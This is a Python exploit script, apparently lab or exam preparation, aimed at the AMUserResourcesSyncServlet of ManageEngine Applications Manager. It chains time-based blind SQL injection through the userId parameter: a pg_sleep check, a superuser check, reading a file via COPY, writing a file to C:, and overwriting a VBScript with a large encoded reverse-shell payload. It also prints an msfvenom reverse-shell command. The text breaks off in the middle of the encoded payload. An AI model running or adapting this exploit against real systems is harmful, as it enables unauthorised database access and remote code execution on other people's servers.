import sys
import re
import os
import hashlib
import requests
import threading
import urllib.parse
import argparse
import zipfile
import time
import string
import itertools
import warnings
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def verify(ip):
    print("[+] Perform Blind Time SQLi with delay of 10 seconds...")
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    params = {
        "ForMasRange": "1",
        "userId": "1;select pg_sleep(10);--"
    }
    start_time = time.time()
    r = requests.get(url, params=params, verify=False)
    end_time = time.time()

    elapsed_time = round(end_time - start_time, 2)
    if elapsed_time > 10 and elapsed_time < 15:
        print("[+] It took the server around {} seconds to response, the server is vulnerable!".format(str(elapsed_time)))
    else:
        print("[-] The server response time is around {} seconds, it is either too long or too short, the server might not be vulnerable.".format(str(elapsed_time)))

def parse_query(query):
    return query.replace("'", "$$")

def check_dbuser(ip):
    print("[+] Perform Blind Time SQLi to check current user...")
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    query = "1;SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;--+"
    query = parse_query(query)

    params = {
        "ForMasRange": "1",
        "userId": query
    }
    start_time = time.time()
    r = requests.get(url, params=params, verify=False)
    end_time = time.time()

    elapsed_time = round(end_time - start_time, 2)
    if elapsed_time > 10 and elapsed_time < 15:
        print("[+] The current DB user is DBA!")
    else:
        print("[+] The current DB user is not DBA.")

def read_file(ip):
    print("[+] Perform Blind Time SQLi to check the first character in the file \"C:\\WebAccess\\Node\\IISSetUpLog.txt\"...")
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    query = "1;create temp table oswe (content text);copy oswe from 'C:\\WebAccess\\Node\\IISSetUpLog.txt';select case when(ascii(substr((select content from oswe limit 1),1,1))=70) then pg_sleep(10) end;drop table oswe--+"
    query = parse_query(query)

    params = {
        "ForMasRange": "1",
        "userId": query
    }
    start_time = time.time()
    r = requests.get(url, params=params, proxies=proxies, verify=False)
    end_time = time.time()

    elapsed_time = round(end_time - start_time, 2)
    if elapsed_time > 10 and elapsed_time < 15:
        print("[+] We can successfully read files!")
    else:
        print("[+] Fail to read files...")

def write_file(ip):
    print("[+] Trying to create file at C:\\offsec.txt...")
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    query = "1;COPY (SELECT 'offsec') to 'C:\\offsec.txt';--+"
    query = parse_query(query)

    params = {
        "ForMasRange": "1",
        "userId": query
    }
    start_time = time.time()
    r = requests.get(url, params=params, proxies=proxies, verify=False)
    print("[+] Done! You can check the file system.")

def copy_to_reverse_shell(ip):
    print("[+] Trying to obtain reverse shell by copying reverse shell payload to \"C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\application\\scripts\\wmiget.vbs\"")
    print("[+] You can use the following msfvenom command to generate the reverse shell payload")
    print("msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444 -e x86/shikata_ga_nai -f vbs\n")


    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    query = "1;copy+(select+convert_from(decode($$%54%32%34%67%52%58%4a%79%62%33%49%67%55%6d%56%7a%64%57%31%6c%49%45%35%6c%65%48%51%36%55%32%56%30%49%47%39%69%61%6c%64%69%5a%57%31%4d%62%32%4e%68%64%47%39%79%49%44%30%67%51%33%4a%6c%59%58%52%6c%54%32%4a%71%5a%57%4e%30%4b%43%4a%58%59%6d%56%74%55%32%4e%79%61%58%42%30%61%57%35%6e%4c%6c%4e%58%59%6d%56%74%54%47%39%6a%59%58%52%76%63%69%49%70%4f%6d%6c%6d%49%45%56%79%63%69%35%4f%64%57%31%69%5a%58%49%67%56%47%68%6c%62%6a%70%58%55%32%4e%79%61%58%42%30%4c%6b%56%6a%61%47%38%67%64%6d%4a%44%63%6b%78%6d%49%43%59%67%49%6b%56%79%63%6d%39%79%49%43%4d%67%49%69%41%6d%49%43%49%67%49%69%41%6d%49%45%56%79%63%69%35%45%5a%58%4e%6a%63%6d%6c%77%64%47%6c%76%62%6a%70%46%62%6d%51%67%53%57%59%36%54%32%34%67%52%58%4a%79%62%33%49%67%52%32%39%55%62%79%41%77%4f%6b%39%75%49%45%56%79%63%6d%39%79%49%46%4a%6c%63%33%56%74%5a%53%42%4f%5a%58%68%30%4f%6c%4e%6c%62%47%56%6a%64%43%42%44%59%58%4e%6c%49%46%64%54%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4c%6b%4e%76%64%57%35%30%4f%6b%4e%68%63%32%55%67%4d%6a%70%7a%64%48%4a%44%62%32%31%77%64%58%52%6c%63%69%41%39%49%46%64%7a%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4b%44%41%70%4f%6e%4e%30%63%6c%46%31%5a%58%4a%35%49%44%30%67%56%33%4e%6a%63%6d%6c%77%64%43%35%42%63%6d%64%31%62%57%56%75%64%48%4d%6f%4d%53%6b%36%55%32%56%30%49%48%64%69%5a%57%31%54%5a%58%4a%32%61%57%4e%6c%63%79%41%39%49%47%39%69%61%6c%64%69%5a%57%31%4d%62%32%4e%68%64%47%39%79%4c%6b%4e%76%62%6d%35%6c%59%33%52%54%5a%58%4a%32%5a%58%49%6f%63%33%52%79%51%32%39%74%63%48%56%30%5a%58%49%73%49%6c%4a%76%62%33%52%63%51%30%6c%4e%56%6a%49%69%4b%54%70%44%59%58%4e%6c%49%44%51%36%63%33%52%79%51%32%39%74%63%48%56%30%5a%58%49%67%50%53%42%58%63%32%4e%79%61%58%42%30%4c%6b%46%79%5a%33%56%74%5a%57%35%30%63%79%67%77%4b%54%70%7a%64%48%4a%56%63%32%56%79%62%6d%46%74%5a%53%41%39%49%46%64%7a%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4b%44%45%70%4f%6e%4e%30%63%6c%42%68%63%33%4e%33%62%33%4a%6b%49%44%30%67%56%33%4e%6a%63%6d%6c%77%64%43%35%42%63%6d%64%31%62%57%56%75%64%48%4d%6f%4d%69%6b%36%63%33%52%79%55%58%56%6c%63%6e%6b%67%50%53%42%58%63%32%4e%79%61%58%42%30%4c%6b%46%79%5a%33%56%74%5a%57%35%30%63%79%67%7a%4b%54%70%54%5a%58%51%67%64%32%4a%6c%62%56%4e%6c%63%6e%5a%70%59%32%56%7a%49%44%30%67%62%32%4a%71%56%32%4a%6c%62%55%78%76%59%32%46%30%62%33%49%75%51%32%39%75%62%6d%56%6a%64%46%4e%6c%63%6e%5a%6c%63%69%68%7a%64%48%4a%44%62%32%31%77%64%58%52%6c%63%69%77%69%55%6d%39%76%64%46%78%44%53%55%31%57%4d%69%49%73%63%33%52%79%56%58%4e%6c%63%6d%35%68%62%57%55%73%63%33%52%79%55%47%46%7a%63%33%64%76%63%6d%51%70%4f%6d%4e%68%63%32%55%67%4e%6a%70%7a%64%48%4a%44%62%32%31%77%64%58%52%6c%63%69%41%39%49%46%64%7a%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4b%44%41%70%4f%6e%4e%30%63%6c%56%7a%5a%58%4a%75%59%57%31%6c%49%44%30%67%56%33%4e%6a%63%6d%6c%77%64%43%35%42%63%6d%64%31%62%57%56%75%64%48%4d%6f%4d%53%6b%36%63%33%52%79%55%47%46%7a%63%33%64%76%63%6d%51%67%50%53%42%58%63%32%4e%79%61%58%42%30%4c%6b%46%79%5a%33%56%74%5a%57%35%30%63%79%67%79%4b%54%70%7a%64%48%4a%52%64%57%56%79%65%53%41%39%49%46%64%7a%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4b%44%51%70%4f%6d%35%68%62%57%56%7a%63%47%46%6a%5a%53%41%39%49%46%64%7a%59%33%4a%70%63%48%51%75%51%58%4a%6e%64%57%31%6c%62%6e%52%7a%4b%44%55%70%4f%6c%4e%6c%64%43%42%33%59%6d%56%74%55%32%56%79%64%6d%6c%6a%5a%58%4d%67%50%53%42%76%59%6d%70%58%59%6d%56%74%54%47%39%6a%59%58%52%76%63%69%35%44%62%32%35%75%5a%57%4e%30%55%32%56%79%64%6d%56%79%4b%48%4e%30%63%6b%4e%76%62%58%42%31%64%47%56%79%4c%47%35%68%62%57%56%7a%63%47%46%6a%5a%53%78%7a%64%48%4a%56%63%32%56%79%62%6d%46%74%5a%53%78%7a%64%48%4a%51%59%58%4e%7a%64%32%39%79%5a%43%6b%36%51%32%46%7a%5a%53%42%46%62%48%4e%6c%4f%6e%4e%30%63%6b%31%7a%5a%79%41%39%49%43%4a%46%63%6e%4a%76%63%69%41%6a%49%47%6c%75%49%48%42%68%63%6d%46%74%5a%58%52%6c%63%6e%4d%67%63%47%46%7a%63%32%56%6b%49%6a%70%58%55%32%4e%79%61%58%42%30%4c%6b%56%6a%61%47%38%67%63%33%52%79%54%58%4e%6e%4f%6c%64%54%59%33%4a%70%63%48%51%75%55%58%56%70%64%43%67%77%4b%54%70%46%62%6d%51%67%55%32%56%73%5a%57%4e%30%4f%6c%4e%6c%64%43%42%33%59%6d%56%74%55%32%56%79%64%6d%6c%6a%5a%58%4d%67%50%53%42%76%59%6d%70%58%59%6d%56%74%54%47%39%6a%59%58%52%76%63%69%35%44%62%32%35%75%5a%57%4e%30%55%32%56%79%64%6d%56%79%4b%48%4e%30%63%6b%4e%76%62%58%42%31%64%47%56%79%4c%43%42%75%59%57%31%6c%63%33%42%68%59%32%55%73%49%48%4e%30%63%6c%56%7a%5a%58%4a%75%59%57%31%6c%4c%43%42%7a%64%48%4a%51%59%58%4e%7a%64%32%39%79%5a%43%6b%36%61%57%59%67%52%58%4a%79%4c%6b%35%31%62%57%4a%6c%63%69%42%55%61%47%56%75%4f%6c%64%54%59%33%4a%70%63%48%51%75%52%57%4e%6f%62%79%42%32%59%6b%4e%79%54%47%59%67%4a%69%41%69%52%58%4a%79%62%33%49%67%49%79%41%69%49%43%41%6d%49%43%49%67%49%69%41%6d%49%45%56%79%63%69%35%45%5a%58%4e%6a%63%6d%6c%77%64%47%6c%76%62%6a%70%46%62%6d%51%67%53%57%59%36%54%32%34%67%52%58%4a%79%62%33%49%67%52%32%39%55%62%79%41%77%4f%6b%39%75%49%45%56%79%63%6d%39%79%49%46%4a%6c%63%33%56%74%5a%53%42%4f%5a%58%68%30%4f%6c%4e%6c%64%43%42%6a%62%32%78%4a%64%47%56%74%63%79%41%39%49%48%64%69%5a%57%31%54%5a%58%4a%32%61%57%4e%6c%63%79%35%46%65%47%56%6a%55%58%56%6c%63%6e%6b%6f%63%33%52%79%55%58%56%6c%63%6e%6b%70%4f%6d%6c%6d%49%45%56%79%63%69%35%4f%64%57%31%69%5a%58%49%67%56%47%68%6c%62%6a%70%58%55%32%4e%79%61%58%42%30%4c%6b%56%6a%61%47%38%67%64%6d%4a%44%63%6b%78%6d%49%43%59%67%49%6b%56%79%63%6d%39%79%49%43%4d%67%49%69%41%67%4a%69%41%69%49%43%49%67%4a%69%42%46%63%6e%49%75%52%47%56%7a%59%33%4a%70%63%48%52%70%62%32%34%36%52%57%35%6b%49%45%6c%6d%4f%6b%39%75%49%45%56%79%63%6d%39%79%49%45%64%76%56%47%38%67%4d%44%70%70%50%54%41%36%52%6d%39%79%49%45%56%68%59%32%67%67%62%32%4a%71%53%58%52%6c%62%53%42%70%62%69%42%6a%62%32%78%4a%64%47%56%74%63%7a%70%70%5a%69%42%70%50%54%41%67%64%47%68%6c%62%6a%70%6f%5a%57%46%6b%5a%58%49%67%50%53%41%69%49%6a%70%47%62%33%49%67%52%57%46%6a%61%43%42%77%59%58%4a%68%62%53%42%70%62%69%42%76%59%6d%70%4a%64%47%56%74%4c%6c%42%79%62%33%42%6c%63%6e%52%70%5a%58%4e%66%4f%6d%68%6c%59%57%52%6c%63%69%41%39%49%47%68%6c%59%57%52%6c%63%69%41%6d%49%48%42%68%63%6d%46%74%4c%6b%35%68%62%57%55%67%4a%69%42%32%59%6c%52%68%59%6a%70%4f%5a%58%68%30%4f%6c%64%54%59%33%4a%70%63%48%51%75%52%57%4e%6f%62%79%42%6f%5a%57%46%6b%5a%58%49%36%61%54%30%78%4f%6d%56%75%5a%43%42%70%5a%6a%70%7a%5a%58%4a%32%61%57%4e%6c%52%47%46%30%59%53%41%39%49%43%49%69%4f%6b%5a%76%63%69%42%46%59%57%4e%6f%49%48%42%68%63%6d%46%74%49%47%6c%75%49%47%39%69%61%6b%6c%30%5a%57%30%75%55%48%4a%76%63%47%56%79%64%47%6c%6c%63%31%38%36%63%32%56%79%64%6d%6c%6a%5a%55%52%68%64%47%45%67%50%53%42%7a%5a%58%4a%32%61%57%4e%6c%52%47%46%30%59%53%41%6d%49%48%42%68%63%6d%46%74%4c%6c%5a%68%62%48%56%6c%49%43%59%67%64%6d%4a%55%59%57%49%36%54%6d%56%34%64%44%70%58%55%32%4e%79%61%58%42%30%4c%6b%56%6a%61%47%38%67%63%32%56%79%64%6d%6c%6a%5a%55%52%68%64%47%45%36%54%6d%56%34%64%44%70%47%64%57%35%6a%64%47%6c%76%62%69%42%72%5a%58%64%4b%61%6c%64%31%64%43%68%4f%5a%47%6c%34%63%47%4a%4d%62%32%5a%33%54%58%4a%61%4b%54%70%6f%55%47%46%45%56%45%31%6b%54%32%39%36%64%33%68%56%49%44%30%67%49%6a%78%43%4e%6a%52%45%52%55%4e%50%52%45%55%67%65%47%31%73%62%6e%4d%36%5a%48%51%39%49%69%59%67%51%32%68%79%4b%44%4d%30%4b%53%41%6d%49%43%4a%31%63%6d%34%36%63%32%4e%6f%5a%57%31%68%63%79%31%74%61%57%4e%79%62%33%4e%76%5a%6e%51%74%59%32%39%74%4f%6d%52%68%64%47%46%30%65%58%42%6c%63%79%49%67%4a%69%42%44%61%48%49%6f%4d%7a%51%70%49%43%59%67%49%69%41%69%49%43%59%67%49%6d%52%30%4f%6d%52%30%50%53%49%67%4a%69%42%44%61%48%49%6f%4d%7a%51%70%49%43%59%67%49%6d%4a%70%62%69%35%69%59%58%4e%6c%4e%6a%51%69%49%43%59%67%51%32%68%79%4b%44%4d%30%4b%53%41%6d%49%43%49%2b%49%69%41%6d%49%45%35%6b%61%58%68%77%59%6b%78%76%5a%6e%64%4e%63%6c%6f%67%4a%69%41%69%50%43%39%43%4e%6a%52%45%52%55%4e%50%52%45%55%2b%49%6a%70%54%5a%58%51%67%61%6e%70%5a%62%32%35%5a%65%55%78%6f%61%58%42%42%55%47%31%78%49%44%30%67%51%33%4a%6c%59%58%52%6c%54%32%4a%71%5a%57%4e%30%4b%43%4a%4e%55%31%68%4e%54%44%49%75%52%45%39%4e%52%47%39%6a%64%57%31%6c%62%6e%51%75%4d%79%34%77%49%69%6b%36%61%6e%70%5a%62%32%35%5a%65%55%78%6f%61%58%42%42%55%47%31%78%4c%6b%78%76%59%57%52%59%54%55%77%6f%61%46%42%68%52%46%52%4e%5a%45%39%76%65%6e%64%34%56%53%6b%36%61%32%56%33%53%6d%70%58%64%58%51%67%50%53%42%71%65%6c%6c%76%62%6c%6c%35%54%47%68%70%63%45%46%51%62%58%45%75%63%32%56%73%5a%57%4e%30%63%32%6c%75%5a%32%78%6c%62%6d%39%6b%5a%53%67%69%51%6a%59%30%52%45%56%44%54%30%52%46%49%69%6b%75%62%6d%39%6b%5a%56%52%35%63%47%56%6b%56%6d%46%73%64%57%55%36%63%32%56%30%49%47%70%36%57%57%39%75%57%58%6c%4d%61%47%6c%77%51%56%42%74%63%53%41%39%49%47%35%76%64%47%68%70%62%6d%63%36%52%57%35%6b%49%45%5a%31%62%6d%4e%30%61%57%39%75%4f%6b%5a%31%62%6d%4e%30%61%57%39%75%49%45%56%50%51%6d%39%73%62%45%4a%52%64%43%67%70%4f%6d%39%55%63%45%56%45%56%6e%68%71%61%69%41%39%49%43%4a%55%56%6e%46%52%51%55%46%4e%51%55%46%42%51%55%56%42%51%55%46%42%4c%79%38%34%51%55%46%4d%5a%30%46%42%51%55%46%42%51%55%46%42%51%56%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%57%64%42%51%55%46%42%51%54%52%6d%64%57%63%30%51%58%52%42%62%6b%35%4a%59%6d%64%43%56%45%30%77%61%46%5a%48%61%48%42%6a%65%55%4a%33%59%32%30%35%62%6d%4e%74%52%6e%52%4a%52%30%35%6f%59%6d%30%31%64%6d%52%44%51%6d%6c%61%55%30%4a%35%5a%46%63%30%5a%32%46%58%4e%47%64%53%52%54%6c%55%53%55%63%78%64%6c%70%48%56%58%56%45%55%54%42%4c%53%6b%46%42%51%55%46%42%51%55%46%42%51%55%4a%52%55%6c%46%42%51%56%52%42%52%55%52%42%52%45%74%6a%56%6e%64%5a%51%55%46%42%51%55%46%42%51%55%46%42%51%55%39%42%51%55%52%33%54%55%78%42%55%55%6b%30%51%55%46%4a%51%55%46%42%51%55%39%42%51%55%46%42%51%55%46%42%51%55%46%43%51%55%46%42%51%55%46%52%51%55%46%42%51%55%6c%42%51%55%46%42%51%55%4a%42%51%55%46%42%55%55%46%42%51%55%46%42%5a%30%46%42%51%6b%46%42%51%55%46%42%52%55%46%42%51%55%46%46%51%55%46%42%51%55%46%42%51%55%46%42%51%55%4a%42%51%55%46%42%51%55%46%6e%51%55%46%53%61%6d%39%42%51%55%46%4a%51%55%46%42%51%55%46%42%51%30%46%42%51%55%4a%42%51%55%46%42%51%55%46%46%51%55%46%42%52%55%46%42%51%55%46%42%51%55%46%42%51%6b%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%64%30%46%42%51%6d%74%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%44%4e%54%42%61%57%47%67%77%51%55%46%42%51%55%74%42%51%55%46%42%51%55%46%52%51%55%46%42%51%55%46%6e%51%55%46%42%51%55%6c%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%44%51%55%46%4e%52%30%46%31%57%6b%64%47%4d%46%6c%52%51%55%46%42%53%6b%46%4c%51%55%46%42%51%55%6c%42%51%55%46%42%51%58%64%42%51%55%46%42%52%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%6e%51%55%52%45%5a%30%78%74%62%47%74%5a%57%46%4a%6f%51%55%46%43%61%30%46%42%51%55%46%42%52%45%46%42%51%55%46%42%51%30%46%42%51%55%46%46%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%56%46%42%51%58%64%33%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%7a%52%42%51%30%4a%42%51%56%41%76%5a%32%74%51%4f%47%78%50%52%45%4a%42%51%55%70%44%55%55%46%42%51%55%46%42%51%55%46%42%51%55%46%45%4c%79%38%76%4c%79%39%42%51%55%46%42%51%56%41%76%4c%79%38%76%4f%45%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%4f%62%6b%64%31%53%54%4d%34%64%58%52%55%57%6d%52%44%56%44%42%59%56%46%42%4b%57%6e%4a%72%52%55%46%71%52%6b%5a%48%62%31%42%30%4c%30%46%4f%52%6d%31%34%4e%56%41%31%56%30%38%79%64%55%4a%5a%61%6c%49%35%4d%33%42%72%65%55%39%56%54%6d%64%73%63%47%59%77%53%30%70%74%64%48%46%68%52%30%35%50%53%6c%70%35%63%45%64%6e%51%6a%55%33%55%47%4e%31%5a%48%56%6a%57%48%64%54%4d%33%6c%4c%61%46%67%7a%64%30%46%43%59%55%56%52%4d%56%6c%54%59%58%6c%56%63%6e%56%42%64%30%70%54%54%6a%4e%77%5a%45%74%6c%4e%55%78%30%51%32%74%76%61%44%42%45%4c%7a%4e%57%4e%46%64%33%52%46%4a%42%5a%6d%68%68%4d%32%46%6c%61%33%6c%43%52%45%56%33%65%6d%70%58%54%30%6c%6a%4c%32%52%44%52%31%64%72%65%46%46%78%52%58%56%46%59%31%4a%4d%61%6a%6c%4f%59%58%46%7a%56%57%74%47%63%6b%39%59%59%30%4e%55%54%6e%52%77%59%55%51%30%65%6a%6c%50%53%6a%45%30%4d%58%4a%6a%61%6c%63%76%53%55%70%57%54%6b%5a%59%61%46%4e%6a%4d%46%70%4d%61%47%4a%30%54%6a%5a%4d%57%47%6c%49%64%30%70%61%4d%32%63%78%61%30%6c%44%5a%55%5a%6f%5a%6e%70%55%59%58%4e%71%63%56%46%69%65%46%56%48%63%47%4a%4c%4d%31%6c%7a%62%6b%70%54%57%6b%67%77%63%33%59%32%64%47%38%76%5a%30%70%54%4d%56%68%6f%56%69%39%7a%57%47%6f%76%57%6d%6c%74%61%55%5a%46%55%47%31%32%61%44%46%45%4e%33%4d%35%5a%6b%78%50%56%58%68%6d%52%48%56%68%56%44%5a%4a%63%6b%67%35%54%46%46%6e%59%57%4e%69%59%6b%31%4c%5a%6b%78%7a%56%7a%46%76%61%6c%70%73%4b%7a%4e%52%65%48%70%57%61%46%6b%32%52%53%39%35%61%6a%63%32%62%30%39%6e%51%30%31%32%64%6d%46%36%53%6a%59%35%52%6e%4e%51%65%6b%67%77%62%58%4e%32%55%6d%5a%7a%56%48%52%34%5a%53%39%45%53%57%35%57%4b%32%5a%31%57%48%4e%50%4d%30%78%53%63%55%4e%52%63%46%55%34%61%6b%5a%76%62%58%64%50%53%6c%6b%76%54%45%59%7a%4d%33%46%6a%5a%56%56%72%63%6c%56%4a%65%6d%5a%6d%52%56%64%47%63%30%70%78%64%6e%46%51%56%44%6c%5a%62%56%4a%43%61%31%52%45%59%6b%78%35%51%31%68%61%61%6e%42%70%54%46%56%73%62%6b%52%6b%59%69%74%79%4d%6a%56%4b%56%47%70%30%5a%46%45%78%62%44%68%6a%4b%33%51%35%5a%30%4a%53%51%54%46%49%4c%7a%56%54%61%55%52%7a%4e%6b%31%47%56%7a%52%51%62%43%74%74%59%31%4a%6b%63%46%42%51%61%46%70%34%63%6c%4a%7a%55%30%56%4b%56%46%46%6b%62%31%59%31%65%54%46%78%62%79%74%4c%65%44%42%73%54%7a%45%35%5a%31%4e%6b%54%54%41%7a%61%33%52%42%52%54%4e%34%5a%33%4e%4c%4d%33%5a%58%56%55%46%4a%4d%45%78%6c%64%6e%6c%77%51%30%56%45%64%31%64%6f%56%33%46%30%56%46%68%76%4e%53%74%46%4f%56%52%72%4d%6b%4e%53%55%6a%68%58%52%30%70%75%53%55%78%72%5a%55%46%6a%51%33%70%59%53%57%45%32%62%6a%6b%78%61%43%74%4d%4d%57%46%59%59%6a%4a%68%64%57%64%6f%62%6c%4a%32%56%56%42%54%4f%47%74%70%62%6a%52%48%5a%31%68%4f%65%6b%68%44%4b%30%68%72%56%33%42%4f%56%46%51%34%59%6e%4a%59%65%48%64%50%63%47%31%47%56%48%56%50%52%6d%56%4a%56%32%5a%4c%62%33%68%4c%5a%54%6c%48%56%57%4e%76%64%57%74%35%65%6c%70%6f%4f%57%39%53%54%44%52%59%54%6b%52%43%4e%6c%63%30%4d%6d%64%61%61%32%64%35%53%6b%78%72%59%6a%68%59%55%48%64%51%4e%47%59%32%65%69%74%74%65%55%64%69%56%55%67%32%55%55%56%70%61%56%70%6a%52%56%68%48%5a%6a%64%77%62%56%68%4e%52%45%46%4f%55%54%4a%78%54%54%46%55%4d%55%4e%46%5a%44%55%32%54%6a%4a%69%52%6d%74%78%63%46%64%69%4e%6d%55%31%57%46%5a%77%61%6c%46%6f%54%54%64%6a%65%47%59%76%4d%53%74%31%65%56%6b%33%56%58%64%55%5a%32%52%69%61%45%45%33%56%45%56%79%65%6a%56%61%53%31%52%57%51%56%68%47%54%58%5a%71%62%54%4e%7a%57%47%4e%35%62%47%4e%78%52%33%46%78%52%6d%46%6f%51%6e%5a%35%4d%6a%4e%4b%55%6d%52%49%56%7a%4e%6d%61%30%31%7a%54%33%42%56%54%30%4a%43%4e%48%56%54%52%31%4e%31%56%55%68%70%56%6d%35%59%56%56%4e%69%4d%6a%59%77%4c%7a%64%6d%4e%6c%68%4b%65%6a%4e%70%56%47%78%42%62%6c%64%32%53%7a%46%6a%5a%6d%39%35%53%6b%31%44%51%54%51%31%56%54%42%78%55%6b%68%61%55%33%67%79%65%54%56%6e%61%6a%4d%79%61%6b%52%61%4d%55%4a%5a%64%6c%6c%51%4e%32%56%4d%57%69%74%5a%53%48%42%6b%62%6e%68%75%4f%47%35%58%4f%47%4e%44%52%6c%56%6a%53%6a%42%7a%56%48%4e%74%55%48%6c%4f%57%57%74%46%51%32%45%72%51%33%42%31%5a%58%5a%4b%53%46%67%31%54%44%56%35%55%48%55%76%61%43%39%6e%65%6c%52%76%59%6c%56%50%4d%44%64%54%57%6d%38%35%57%6b%67%35%64%58%52%6d%57%47%39%36%4d%57%4e%75%61%6e%46%51%52%56%56%72%4d%31%64%68%4e%46%42%6b%51%57%56%78%61%48%52%74%62%7a%67%7a%4c%32%5a%68%56%6b%51%31%5a%45%4d%30%61%45%46%75%54%48%5a%30%64%6d%52%71%56%6c%4a%55%62%33%64%5a%56%45%31%5a%61%57%68%31%65%55%74%68%53%69%74%35%52%44%41%32%4f%44%68%58%5a%48%56%44%56%57%78%55%54%48%42%58%55%55%46%52%54%32%31%51%61%6a%68%36%55%31%4a%30%52%30%46%4a%64%6b%31%52%55%31%4d%33%53%6c%5a%61%61%43%